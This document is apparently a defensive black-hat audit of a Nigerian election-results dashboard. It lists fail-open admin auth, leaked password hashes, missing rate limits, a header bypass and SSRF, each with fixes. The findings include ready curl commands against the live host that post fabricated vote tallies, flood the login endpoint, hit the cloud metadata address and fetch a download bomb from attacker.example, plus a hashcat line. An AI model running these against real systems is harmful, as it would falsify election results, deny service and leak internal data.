# 07 — Adversary (black-hat) audit — Nigeria Election Dashboard — 2026-07-19

**Persona:** The Adversary. 6 hours, a public app (`https://elections.innoedgetech.com`), and the accidentally-public repo. Motives: (a) falsify displayed election results, (b) abuse the free infra, (c) exfiltrate the admin surface, (d) DoS on election day. All findings reasoned from code only — **no production was touched**.

---

## Executive summary — highest-value attack chains

The crown jewel is **a changed number on the public choropleth**. There are **two independent paths to it**, and they converge on the same handler (`POST /api/admin/results` / `/api/admin/import`, `backend/app/api/admin.py`).

### Chain 1 — Unauthenticated result falsification via fail-open admin gate (CRITICAL)
`_require_admin()` (`admin.py:43-47`) returns **`True` when `ADMIN_TOKEN` is unset or blank** ("not configured → allow"). `/api/admin` is **exempt from the API-key gate** (`api_gate.py:28-34`) and the DO ingress routes **all `/api/*` straight to Flask, publicly** (`.do/app.yaml:18-20`). `ADMIN_TOKEN` is **not in the version-controlled spec** for the `web` service (`.do/app.yaml:5-39`) — its presence depends entirely on un-audited console state, and the owner's own note says the token path was **never verified live** (`.claude/state/UPDATES.md:5`). Whenever the token is unset — the code default, and the state any spec-based redeploy reverts to — **anyone on the internet can POST fabricated per-party vote tallies**, which flip the election to `live` and feed `/api/analysis/winners` → the choropleth (`admin.py:15-18, 112-197`).

> **One-liner:** `curl -X POST .../api/admin/results -d '{"election_id":N,"scope":"state","results":[{"party_code":"APC","votes":49999999},{"party_code":"PDP","votes":1}]}'` — no credential when the token is unset — repaints a state on the live map.

### Chain 2 — Admin takeover via leaked git-history password hashes (HIGH→CRITICAL if rotation didn't durably deploy)
Two real, deployed bcrypt admin/viewer hashes sit in **public git history** (commits before `5dd2b04`; `git log -p -S '$2b$'`). Commit `861b6e9` reset both passwords to **"clean alphanumeric"** — a narrow, offline-crackable keyspace. Crack offline → log in at `/login` → obtain an admin NextAuth session → drive the `/admin-api/*` proxy, which **injects the real `X-Admin-Token` server-side** (`frontend/src/app/admin-api/[...path]/route.ts:32-51`). This reaches the same write handler **even when the token is correctly set**. The rotation is claimed done, but the `seed-users` job is a **no-op when `SEED_USERS` is unset** (`.do/app.yaml:176-191`), so the same "not-in-committed-spec → dropped on redeploy" regression that opens Chain 1 can also silently un-rotate the passwords.

### Chain 3 — Trivial election-day DoS (CRITICAL)
**Zero inbound rate limiting anywhere** (confirmed: the only throttle is the scraper's *outbound* token bucket toward INEC). `web` and `frontend` each run a **single `basic-xxs` instance** (1 vCPU / 512 MB, `instance_count: 1`, `.do/app.yaml:13-14, 49-50`). `POST /api/auth/login` runs a **bcrypt verify on every request** with no throttle (`auth.py:32`) — a bcrypt-CPU-exhaustion primitive. A modest request flood on election day saturates the box; the whole public API and dashboard go dark exactly when civic trust needs them.

**Is unauthenticated result falsification possible? YES — conditionally, and the condition is the code's own default.** Whenever `ADMIN_TOKEN` is unset/blank on the Flask `web` service, `POST /api/admin/results` accepts writes from anyone with no credential. The code neither prevents nor detects that state, and the committed infra spec actively produces it.

### Severity table

| ID | Title | Severity |
|----|-------|----------|
| F-701 | Admin write endpoints fail **open** → unauthenticated result falsification | **Critical** |
| F-702 | Leaked bcrypt admin hashes in public git history + "clean alphanumeric" passwords → admin takeover | **High** |
| F-703 | No inbound rate limiting + single `basic-xxs` + bcrypt on `/login` → trivial election-day DoS | **Critical** |
| F-704 | API-key gate bypassable with a client-controlled `Sec-Fetch-Site` header (live-confirmed) → anonymous abuse of the shared prod DB | **High** |
| F-705 | SSRF + download-bomb in `/api/admin/ocr` (`image_url`) | **High** |
| F-706 | Admin-token comparison is not timing-safe (`==`) | **Medium** |
| F-707 | Self-approve an API key + request-count write-amplification when the admin gate fails open | **Medium** |

Note on what is **not** weak: the API-key (`ned_` + `secrets.token_hex(24)`, 192-bit) and `application_ref` (`secrets.token_urlsafe(24)`, 192-bit) have strong entropy (`developer.py:31-36`) — **no key forgery or enumeration**. New `ApiClient` rows default to `status="pending"` with `api_key=NULL` (`models.py:57-60`), so the apply flow itself does not self-issue. The falsification risk is entirely in the admin gate, not the key system.

---

## Findings

### F-701: Admin write endpoints fail OPEN — unauthenticated result falsification
- **Severity**: Critical
- **Persona**: Adversary
- **Surface**: backend
- **Files**: `backend/app/api/admin.py:43-47` (gate), `:112-197` (`/results` write), `:252-314` (`/import` write); `backend/app/api_gate.py:28-34` (admin exempt); `.do/app.yaml:5-39` (web env — no `ADMIN_TOKEN`), `:18-20` (public `/api` route)
- **Problem**: `_require_admin()` returns `True` when `os.environ.get("ADMIN_TOKEN","")` is empty ("not configured → allow"). `/api/admin` is exempt from the key gate, and DO routes all `/api/*` to Flask publicly, so the Next.js NextAuth proxy is *not* the only door — the Flask `/api/admin/*` endpoints are directly internet-reachable, guarded solely by this fail-open check. `ADMIN_TOKEN` is absent from the committed spec's `web` service, so its live presence is unverified (owner note `UPDATES.md:5`) and a spec-based `doctl apps update` reverts it to unset.
- **Impact**: Anyone on the internet can write/replace per-party vote tallies for any election and flip it to `live`; rows feed `/api/analysis/winners` + `/api/analysis/swing` → the public choropleth and comparison repaint automatically (`admin.py:15-18`). This is disinformation-grade falsification of a civic election-results surface. Blast radius: every election, every state, silently.
- **Repro / Evidence**:
  ```python
  # admin.py:43-47
  def _require_admin() -> bool:
      expected = os.environ.get("ADMIN_TOKEN", "")
      if not expected:
          return True  # not configured → allow  ← fail-open
      return request.headers.get("X-Admin-Token", "") == expected
  ```
  ```bash
  # election_id is enumerable from the public GET /api/elections
  curl -s -X POST https://elections.innoedgetech.com/api/admin/results \
    -H 'Content-Type: application/json' \
    -d '{"election_id": 42, "scope": "state",
         "results": [{"party_code":"APC","votes":49999999},
                     {"party_code":"PDP","votes":1}]}'
  # → {"ok":true,"inserted":2,"scope":"state"} when ADMIN_TOKEN is unset
  ```
- **Recommended fix**: Fail **closed** — in production, refuse to serve admin writes when `ADMIN_TOKEN` is unset (raise at startup in `create_app`/`Config.from_env`, so `ENV=production` without a token aborts the boot). Add `ADMIN_TOKEN` (SECRET scope) to the committed `web` service spec so redeploys can't drop it. Prefer moving `/api/admin/*` off the public route entirely (internal-only, reachable solely via the authenticated proxy).
- **Effort**: S (fix) / M (route isolation)
- **Tags**: auth, fail-open, result-integrity, critical, quick-win

---

### F-702: Leaked bcrypt admin hashes in public git history → offline crack → admin takeover
- **Severity**: High
- **Persona**: Adversary
- **Surface**: backend / infra
- **Files**: git history (`backend/app/seed_users.py` blobs before `5dd2b04`); `.do/app.yaml:176-191` (`seed-users` no-op when `SEED_USERS` unset); `frontend/src/app/admin-api/[...path]/route.ts:32-51` (proxy injects token)
- **Problem**: `git log -p --all -S '$2b$'` yields at least two real `\$2b\$12\$…` admin/viewer hashes that were committed and deployed. Commit `861b6e9` ("reset both passwords to clean alphanumeric") advertises a small, structured keyspace — offline hashcat against a 12-round bcrypt is feasible for a short alphanumeric password. A cracked admin password grants a NextAuth admin session, and the `/admin-api/*` proxy injects the real `X-Admin-Token` server-side, so **the attacker never needs the token** and this works even when F-701 is patched. Rotation is claimed, but `seed-users` is a no-op when `SEED_USERS` is unset, so the same drop-on-redeploy regression can silently restore the old credentials.
- **Impact**: Full admin takeover → result falsification (via the proxy), API-key approvals, SSRF (F-705). Even if the current password is rotated, the disclosed generation pattern ("clean alphanumeric", fixed-ish length) shrinks the search space for any future credential leak.
- **Repro / Evidence**:
  ```bash
  git log -p --all -S '$2b$' -- 'backend/*' | grep -E 'password_hash.*\$2b\$'
  #   - "password_hash": "$2b$12$Bbs68.caSBebuh...."   (admin)
  #   - "password_hash": "$2b$12$.pRPeF8PjK1mIgG...."   (viewer)
  # → hashcat -m 3200 hashes.txt -a 3 ?l?u?d?l?u?d?l?u?d?l?u?d   (clean-alnum mask)
  ```
- **Recommended fix**: Treat both historical passwords as permanently burned — confirm the live rotation actually deployed (not a `SEED_USERS`-unset no-op). Enforce a strong, high-entropy admin password policy (not "clean alphanumeric"). Consider purging the hashes from history (BFG) — mainly to remove the pattern signal. Add MFA or an IP allowlist to `/admin`.
- **Effort**: M
- **Tags**: auth, secrets-leak, git-history, admin-takeover

---

### F-703: No inbound rate limiting + single `basic-xxs` + bcrypt-on-login → trivial election-day DoS
- **Severity**: Critical
- **Persona**: Adversary
- **Surface**: backend / infra
- **Files**: whole backend (no limiter present); `backend/app/api/auth.py:32` (bcrypt per request); `.do/app.yaml:13-14, 49-50` (single `basic-xxs`)
- **Problem**: There is **no rate limiting on any inbound endpoint** — not on `/api/auth/login`, `/api/developer/apply`, nor the public read API. `web` and `frontend` each run one `basic-xxs` (1 vCPU / 512 MB) instance with no autoscale. `/api/auth/login` performs a `bcrypt.checkpw` on every attempt, turning each unauthenticated request into ~50-100 ms of server CPU — an asymmetric CPU-exhaustion primitive. The public API also gets a DB write on every *authenticated* read (`api_gate.py:57-58` bumps `last_used_at`/`request_count`), amplifying load against the shared cluster.
- **Impact**: On election day — the one day the dashboard matters — a modest flood (a few hundred concurrent login POSTs, or a gate-bypassed read loop from F-704) saturates the single vCPU and takes the public results surface offline. Also enables password brute-force with no lockout.
- **Repro / Evidence**:
  ```bash
  # bcrypt-CPU exhaustion — each request burns ~1 bcrypt on a 1-vCPU box
  seq 1 100000 | xargs -P200 -I_ curl -s -X POST \
    https://elections.innoedgetech.com/api/auth/login \
    -H 'Content-Type: application/json' -d '{"email":"a@b.co","password":"x"}' >/dev/null
  ```
- **Recommended fix**: Add `flask-limiter` (Redis or in-memory) — strict per-IP caps on `/api/auth/login` (e.g. 5/min + exponential backoff) and `/api/developer/apply`, looser caps on public reads. Put the app behind the Caddy proxy's rate-limit / Cloudflare in front. Raise `instance_count` and/or add a CDN cache for the read API on election day. Cap concurrency so bcrypt can't monopolize the vCPU.
- **Effort**: M
- **Tags**: dos, rate-limiting, availability, election-day, critical

---

### F-704: API-key gate bypassable via a client-controlled `Sec-Fetch-Site` header (live-confirmed) → anonymous abuse of the shared prod DB
- **Severity**: High
- **Persona**: Adversary
- **Surface**: backend
- **Files**: `backend/app/api_gate.py:39-44` (`_is_same_origin`), `:62-73` (gate); `backend/app/config.py:60` (`CORS_ORIGINS` default `*`)
- **Problem**: `_is_same_origin()` grants a free pass when the request carries `Sec-Fetch-Site: same-origin`, **or** an `Origin`/`Referer` whose host equals `request.host` — all of which are attacker-controlled in a raw HTTP client. The code comments concede this is "an access-management signal, not a security boundary," and the data is free by design, so this is not a falsification vector — but it defeats the *only* attribution/accountability control and removes any per-key throttle. The owner's own note confirms it works on prod: "`Sec-Fetch-Site: same-origin` → 200 list" (`UPDATES.md:5`).
- **Impact**: Fully anonymous, unmetered programmatic scraping and load generation against a `basic-xxs` Flask box **and the shared `apcng-db` managed cluster** (`.do/app.yaml:110-119`) — blast radius reaches other Innoedge production data co-located on that cluster. Directly fuels the F-703 DoS and denies the operator any ability to identify or cut off an abuser.
- **Repro / Evidence**:
  ```bash
  # No key needed — one header restores "same-origin" trust:
  curl -s 'https://elections.innoedgetech.com/api/analysis/winners?election_id=1' \
    -H 'Sec-Fetch-Site: same-origin'        # → 200, keyless
  # Loop it to generate unmetered, unattributable load on the shared DB.
  ```
- **Recommended fix**: Accept that same-origin fetch metadata cannot gate a security decision — keep it only as a soft UX allowance and apply **rate limiting to the same-origin path too** (F-703). If attribution matters, require the key for all non-browser traffic and rate-limit per-IP regardless of origin claims. Pin `CORS_ORIGINS` to the real dashboard origin instead of `*`.
- **Effort**: S–M
- **Tags**: auth-bypass, abuse, shared-infra, attribution

---

### F-705: SSRF + download-bomb in `/api/admin/ocr` (`image_url`)
- **Severity**: High
- **Persona**: Adversary
- **Surface**: backend
- **Files**: `backend/app/api/admin.py:204-225` (`ocr_ec8a`, `requests.get(str(url), timeout=30)`); supporting `backend/app/ocr/batch.py:127-134`
- **Problem**: `/api/admin/ocr` fetches an attacker-supplied `image_url` with only a `startswith("http")` check — no host allowlist, no private-IP/link-local block, no redirect cap, no response-size limit. The failure path returns `f"image fetch failed: {exc}"`, leaking connection-level detail of internal targets (semi-blind SSRF). Because it sits behind the fail-open `_require_admin()` (F-701), it is unauthenticated whenever the token is unset — otherwise reachable via a cracked admin session (F-702).
- **Impact**: Server-side requests to internal/link-local addresses (e.g. `http://169.254.169.254/…` metadata, `http://web:8080`, other services on the App Platform / proxy-droplet network), internal port scanning, and use of the server as a request reflector. No size cap → point it at a multi-GB file or a decompression-bomb image to OOM the 512 MB container (DoS). Error-message reflection turns blind SSRF into an oracle.
- **Repro / Evidence**:
  ```bash
  # SSRF (no token when fail-open):
  curl -s -X POST https://elections.innoedgetech.com/api/admin/ocr \
    -H 'Content-Type: application/json' \
    -d '{"image_url":"http://169.254.169.254/metadata/v1.json"}'
  # Bomb:
  curl -s -X POST https://elections.innoedgetech.com/api/admin/ocr \
    -H 'Content-Type: application/json' \
    -d '{"image_url":"http://attacker.example/10GB.bin"}'   # no size cap → OOM
  ```
- **Recommended fix**: Enforce an allowlist of INEC result-host domains; resolve the host and reject private/link-local/loopback ranges (block DNS-rebinding by pinning the resolved IP); disable redirects; cap `Content-Length` and streamed bytes (e.g. 10 MB); return a generic error, never the exception string. Fix F-701 so this is never unauthenticated.
- **Effort**: M
- **Tags**: ssrf, dos, input-validation, cloud-metadata

---

### F-706: Admin-token comparison is not timing-safe
- **Severity**: Medium
- **Persona**: Adversary
- **Surface**: backend
- **Files**: `backend/app/api/admin.py:47`; `backend/app/api/scrape.py:26`
- **Problem**: Both admin gates compare with Python `==` (`request.headers.get("X-Admin-Token","") == expected`), which short-circuits on the first differing byte — a timing side-channel. Network jitter makes this hard to exploit remotely, but it is a free correctness fix and defense-in-depth for the one secret protecting result integrity.
- **Impact**: Theoretical byte-by-byte recovery of `ADMIN_TOKEN` under favorable (e.g. co-located) conditions. Low practical likelihood, high consequence if it landed.
- **Repro / Evidence**: `return request.headers.get("X-Admin-Token", "") == expected  # admin.py:47`
- **Recommended fix**: `hmac.compare_digest(given, expected)`; centralize the check in one helper so `admin.py` and `scrape.py` share it.
- **Effort**: S
- **Tags**: crypto, timing-attack, quick-win

---

### F-707: Self-approve an API key + request-count write-amplification when the admin gate fails open
- **Severity**: Medium
- **Persona**: Adversary
- **Surface**: backend
- **Files**: `backend/app/api/admin.py:330-382` (`/api-clients`, `/{id}/decision`); `backend/app/api/developer.py:84-98` (`/status` returns key when approved); `backend/app/api_gate.py:47-59` (write-per-read)
- **Problem**: With the admin gate failing open (F-701), `GET /api/admin/api-clients` enumerates every applicant's name/email/use-case/**key** and `POST /api/admin/api-clients/<id>/decision {"action":"approve"}` approves any application — including the attacker's own — with no credential. The attacker then reads the issued key back via `POST /api/developer/status` using their `application_ref`. Separately, every authenticated read triggers a DB write (`last_used_at`/`request_count` bump), a minor amplification an attacker can drive with a stolen/self-issued key.
- **Impact**: Self-issued "legitimate" API key (persistence + attribution laundering) and disclosure of all applicants' emails/keys (PII + credential exfiltration) — all contingent on the same fail-open as F-701, so it is strictly downstream of that fix. Lower standalone priority because the gate is already bypassable for reads (F-704).
- **Repro / Evidence**:
  ```bash
  # when ADMIN_TOKEN unset:
  curl -s https://elections.innoedgetech.com/api/admin/api-clients        # dumps all keys/emails
  curl -s -X POST https://elections.innoedgetech.com/api/admin/api-clients/7/decision \
    -H 'Content-Type: application/json' -d '{"action":"approve"}'         # self-approve
  ```
- **Recommended fix**: Resolved by fail-closed admin auth (F-701). Additionally, do not return other clients' `api_key` in the list response beyond what the operator strictly needs; consider masking keys in the admin list.
- **Effort**: S (once F-701 lands)
- **Tags**: authz, pii, persistence, depends-on-F-701

---

## Defender's homework (highest-leverage controls, in order)

1. **Fail closed on `ADMIN_TOKEN`** and bake it (SECRET) into the committed `web` spec — single change that kills Chain 1 (F-701), the unauthenticated leg of F-705, and all of F-707.
2. **Add inbound rate limiting** (per-IP, strict on `/login` and `/apply`) + a CDN/edge cache and more than one instance for election day — kills F-703 and defangs F-704 abuse.
3. **Confirm the password rotation durably deployed, enforce strong admin passwords, add MFA/IP-allowlist to `/admin`** — kills Chain 2 (F-702).
4. **Move `/api/admin/*` off the public route** (internal-only, reachable solely through the authenticated proxy) — makes F-701/F-705/F-707 unreachable even under misconfiguration.
5. **SSRF allowlist + size/redirect caps + generic errors** on `/api/admin/ocr` — kills F-705.
6. `hmac.compare_digest` for the token (F-706); pin `CORS_ORIGINS` (F-704).
